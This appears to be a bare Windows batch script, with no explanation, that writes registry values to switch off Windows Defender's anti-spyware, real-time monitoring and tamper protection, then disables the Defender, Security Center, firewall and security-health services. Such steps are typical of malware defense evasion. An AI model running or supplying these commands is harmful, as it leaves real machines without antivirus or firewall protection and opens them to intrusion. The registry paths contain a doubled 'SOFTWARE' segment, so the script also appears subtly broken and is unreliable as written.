Reg.exe add "HKLM\SOFTWARE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f
sc config wscsvc start=disabled
sc config MDCoreSvc start=disabled
sc config WinDefend start=disabled
sc config WdNisSvc start=disabled
sc config mpssvc start=disabled
sc config SecurityHealthService start=disabled